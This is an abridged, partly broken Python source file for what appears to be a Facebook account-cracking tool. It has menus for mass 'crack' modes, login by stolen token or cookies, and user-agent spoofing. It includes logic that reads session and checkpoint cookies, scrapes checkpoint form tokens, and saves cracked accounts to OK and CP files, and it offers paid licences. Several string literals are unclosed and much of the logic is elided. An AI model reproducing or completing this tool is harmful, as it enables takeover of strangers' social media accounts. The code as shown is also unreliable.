...
def banner():
    print("\n%s    _________ __     \n%s   / ____/ (_) /____  ║ %sCoded By %sDapunta %s& %sRizal\n%s  / __/ / / / __/ _ \ ║ %sFB %s: %sSULMAN♥King\n%s / /___/ / / /_/  __/ ║ %sFB %s: %sSULMAN♥KBIR(X.X.X)\n%s/_____/_/_/\__/\___/  ║ %sGithub %s: %sLTC\n"%(O,O,P,O,P,O,O,P,O,P,O,P,O,P,O,P,O,P))
...
def menu():
    ...
    try:
        ...
        print('%s࿐ྂ♡ B3W4F4♡ ࿐ྂ %sWaduh Ngab %s]%s'%(M,P,M,P))
        print('%s║'%(M))
    ...
    try:
        ...
        ip = " "
    print('%s࿐ྂ♡ B3W4F4♡ ࿐ྂ %sSelamat Datang %s %s]'%(O,P,n,O))
    print('%s║'%(O))
    ...
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sPUBLIC CR4CK %s'%(O,P,O,P,jid))
    print('%s╠══[%s2%s] %sFR!3ND LIST CRACK %s'%(O,P,O,P,jid))
    print('%s╠══[%s3%s] %sL1K3 L!$T CR4CK %s'%(O,P,O,P,jid))
    print('%s╠══[%s4%s] %s T4RG3T CR4CK'%(O,P,O,P))
    print('%s╠══[%s5%s] %sGM4!L CR4CK %s'%(O,P,O,P,pro))
    print('%s╠══[%s6%s] %sCH3K CP 4CCOUNT'%(O,P,O,P))
    print('%s╠══[%s7%s] %sCH3K 0K ID 4CCOUNT %s'%(O,P,O,P,pro))
    print('%s╠══[%s8%s] %sUser Agent'%(O,P,O,P))
    print('%s╠══[%s9%s] %s%s'%(O,P,O,P,upgrade))
    print('%s╠══[%s0%s] %s0 INT LTC(L4ND_T3_CH4R3😜'%(O,P,O,P))
...
def ugen():
    ...
    if pmu in[""]:
        ...
        try:
            ...
            ugent.write(ua)
            ugent.close()
            jalan("\n%s࿐ྂ♡ B3W4F4♡ ࿐ྂ %sBerhasil Mengganti User Agent %s]"%(O,P,O))
            print('%s║'%(O))
            input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
            menu()
        except (KeyError,IOError):
            jalan("\n%s࿐ྂ♡ B3W4F4♡ ࿐ྂ %sGagal Mengganti User Agent %s]"%(M,P,M))
            print('%s║'%(M))
        ...
        jalan("\n%s࿐ྂ♡ B3W4F4♡ ࿐ྂ %sIni Adalah User Agent Anda Saat Ini %s]"%(O,P,O))
        print('%s║'%(O))
        input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
        menu()
...
def hasil():
    clear()
    banner()
    jalan('%s࿐ྂ♡ B3W4F4♡ ࿐ྂ %sHasil Crack %s]'%(O,P,O))
    print('%s║'%(O))
    ...
    if ch in ['']:
        ...
        try:
            ...
            print('\n%s࿐ྂ♡ B3W4F4♡ ࿐ྂ%s•%s] %sTotal Hasil Crack Tanggal %s Adalah %s ࿐ྂ♡ B3W4F4♡ ࿐ྂ'%(O,P,O,P,del1,len(ppp)))
        except (KeyError,IOError):
...
def log_hasil(user, pasw):
    ...
    try:
        ...
        print("%s[%s!%s] %s࿐ྂ♡ B3W4F4♡ ࿐ྂ Terkena Spam"%(M,P,M,P))
    if "c_user" in ses.cookies:
        print("%s[%s•%s] %s࿐ྂ♡ B3W4F4♡ ࿐ྂ OK Tidak Checkpoint"%(H,P,H,P))
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        ...
        ngew = [yy.text for yy in xnxx.find_all("option")]
        if(str(len(ngew))=="0"):
            print("%s[%s•%s] %s࿐ྂ♡ B3W4F4♡ ࿐ྂ One Tap"%(H,P,H,P))
        else:
...
def cek_hasil():
    cek_license()
    jalan('%s╠══[ %sCek Opsi ࿐ྂ♡ B3W4F4♡ ࿐ྂ Hasil Crack %s]'%(O,P,O))
    print('%s║'%(O))
    ...
    print("%s╚══[%s•%s] %sJumlah ࿐ྂ♡ B3W4F4♡ ࿐ྂ : %s"%(O,P,O,P,str(len(buka_baju))))
    print("")
    for memek in buka_baju:
        ...
        print("")
    print("")
    print('%s࿐ྂ♡ B3W4F4♡ ࿐ྂ%s•%s] %sProses Pengecekan Selesai'%(O,P,O,P))
    print('%s║'%(O))
    input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
    menu()
...
def buy_license():
    clear()
    banner()
    jalan('%s࿐ྂ♡ B3W4F4♡ ࿐ྂ%s Menu License Key %s]'%(O,P,O))
    print('%s║'%(O))
...
def cek_license():
    try:
        ...
        jalan('\n%s࿐ྂ♡ B3W4F4♡ ࿐ྂ%s•%s] %sKamu Adalah Pengguna Gratis'%(O,P,O,P))
...
def var_menu():
    print('%s࿐ྂ♡ B3W4F4♡ ࿐ྂ %s࿐ྂ♡ B3W4F4♡L0G!N T0LL ࿐ྂ %s]'%(O,P,O))
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sL0G!N BY T0K3N'%(O,P,O,P))
    print('%s╠══[%s2%s] %sL0G!N BY C00K!3S'%(O,P,O,P))
    print('%s╠══[%s3%s] %s!F Y0U BUY TH!S SECRTP TO CONTACT M3'%(O,P,O,P))
    print('%s╠══[%s4%s] %sIF U $3R!0US 92344481942WTSP CONTACT KR3%(O,P,O,P))
    print('%s╠══[%s0%s] %sLTC'%(O,P,O,P))
def var_tutor():
    mlaku('%s࿐ྂ♡ B3W4F4♡ ࿐ྂ%s Tips & Tutorial %s]'%(O,P,O))
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sUJ3  Token'%(O,P,O,P))
    print('%s╠══[%s2%s] %sUJ3 C00K13S'%(O,P,O,P))
    print('%s╠══[%s3%s] %sDONT USE THIS '%(O,P,O,P))
    print('%s╠══[%s4%s] %sCOMMING SOON'%(O,P,O,P))
def tutor_target():
    mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
    mlaku('%s║ %s1 %s║ %s࿐ྂ♡ B3W4F4♡ ࿐ྂ     %s║'%(O,P,O,P,O))
    mlaku('%s║ %s2 %s║ %s࿐ྂ♡ B3W4F4♡ ࿐ྂ         %s║'%(O,P,O,P,O))
    mlaku('%s║ %s3 %s║ %s࿐ྂ♡ B3W4F4♡ ࿐ྂ   %s║'%(O,P,O,P,O))
    mlaku('%s║ %s4 %s║ %s࿐ྂ♡ B3W4F4♡ ࿐ྂ      %s║'%(O,P,O,P,O))
    mlaku('%s║ %s5 %s║ %s࿐ྂ♡ B3W4F4♡ ࿐ྂ   %s║'%(O,P,O,P,O))
    mlaku('%s║ %s6 %s║ %s࿐ྂ♡ B3W4F4♡ ࿐ྂt                      %s║'%(O,P,O,P,O))
    mlaku('%s║ %s7 %s║ %s࿐ྂ♡ B3W4F4♡ ࿐ྂ10001xx\' %s║'%(O,P,O,P,O))
    mlaku('%s║ %s8 %s║ %s࿐ྂ♡ B3W4F4♡ ࿐ྂ   %s║'%(O,P,O,P,O))
    mlaku('%s║ %s9 %s║ %s࿐ྂ♡ B3W4F4♡ ࿐ྂ   %s║'%(O,P,O,P,O))
    mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(O))
    print('%s║'%(O))
def tutor_crack():
    mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
    mlaku('%s║ %s1 %s║ %s࿐ྂ♡ BTRZ KI MAKI CHUT ✌️♡ ࿐ྂ           %s║'%(O,P,O,P,O))
    mlaku('%s║ %s2 %s║ %sMetode Mbasic : ࿐ྂ♡ B3ST ♡ ࿐ྂ  %s║'%(O,P,O,P,O))
    mlaku('%s║ %s3 %s║ %sMetode Mobile : ࿐ྂ♡ ULTR4♡ ࿐ྂ OK Besar  %s║'%(O,P,O,P,O))
    mlaku('%s║ %s4 %s║ %s࿐ྂ♡ DONT US3 WIFI♡ ࿐ྂ)    %s║'%(O,P,O,P,O))
    mlaku('%s║ %s5 %s║ %s࿐ྂ♡ B3W4F4 (BOLTI PUBLIC APUN KO ♡ ࿐ྂ       %s║'%(O,P,O,P,O))
    mlaku('%s║ %s6 %s║ %sJAHAJ LGAIN OK IDES K LIY࿐✈️✈️ ✈️♡ ࿐ྂ                  %s║'%(O,P,O,P,O))
    mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(O))
    print('%s║'%(O))
def var_author():
    mlaku('%s࿐ྂ♡ B3W4F4♡ ࿐ྂ %sAuthor & Team Project %s]'%(O,P,O))
    mlaku('%s║'%(O))
    mlaku('%s╠══[%s•%s] %sAuthor :'%(O,P,O,P))
    mlaku('%s║     • %s࿐ྂ♡ B3W4F4♡ ࿐ྂ X'%(O,P))
    mlaku('%s║     • %s࿐ྂ♡ B3W4F4♡ ࿐ྂ%(O,P))
    mlaku('%s║'%(O))
    mlaku('%s╠══[%s•%s] %sTeam Project %sXNSCODE%s :'%(O,P,O,P,O,P))
    mlaku('%s║     • %s ࿐ྂ♡ B3W4F4♡ ࿐ྂ'%(O,P))
    mlaku('%s║     • %࿐ྂ♡ B3W4F4♡ ࿐ྂ%(O,P))
    mlaku('%s║     • %s࿐ྂ♡ B3W4F4♡ ࿐ྂ'%(O,P))
    mlaku('%s║     • %s࿐ྂ♡ B3W4F4♡ ࿐ྂ'%(O,P))
    mlaku('%s║     • %s࿐ྂ♡ B3W4F4♡ ࿐ྂ'%(O,P))
    mlaku('%s║     • %s࿐ྂ♡ B3W4F4♡ ࿐ྂ'%(O,P))
    ...
    mlaku('%s║'%(O))
def var_ugen():
    print("%s╠══[%s1%s] %࿐ྂ♡ B3W4F4♡ ࿐ྂ User Agent"%(O,P,O,P))
    print("%s╠══[%s2%s] %s࿐ྂ♡ B3W4F4♡ ࿐ྂ %s(%sManual%s)"%(O,P,O,P,O,P,O))
    print("%s╠══[%s3%s] %s࿐ྂ♡ B3W4F4♡ ࿐ྂUser Agent %s(%sSesuaikan HP%s)"%(O,P,O,P,O,P,O))
    print("%s╠══[%s4%s] %࿐ྂ♡ B3W4F4♡ ࿐ྂ User Agent"%(O,P,O,P))
    print("%s╠══[%s5%s] %s࿐ྂ♡ B3W4F4♡ ࿐ྂ Agent"%(O,P,O,P))
    print("%s╠══[%s0%s] %࿐ྂ♡ B3W4F4♡ ࿐ྂ"%(O,P,O,P))
def start_method():
    print('%s║'%(O))
...
def started():
    ...
    print('%s╠══[%s•%s] %s࿐ྂ♡ B3W4F4♡ ࿐ྂ [OK] Disimpan Ke OK/%s.txt'%(O,P,O,P,tanggal))
    print('%s╠══[%s•%s] %s࿐ྂ♡ B3W4F4♡ ࿐ྂ [CP] Disimpan Ke CP/%s.txt'%(O,P,O,P,tanggal))
